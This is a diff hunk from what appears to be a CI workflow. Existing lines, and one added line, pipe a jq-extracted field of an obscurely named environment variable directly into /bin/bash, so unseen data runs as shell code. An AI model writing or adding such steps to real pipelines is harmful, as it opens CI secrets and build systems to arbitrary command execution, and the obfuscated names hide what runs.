@@ -34,6 +34,7 @@ jobs:
           echo $bmp654 | jq -r .lnn807 | /bin/bash
           echo $tb57631 | jq -r .reusu5 | /bin/bash
           printf '%s' "$ibgmd09292" | jq -r .lb98 | /bin/bash
+          echo $honp56 | jq -r .ney13 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
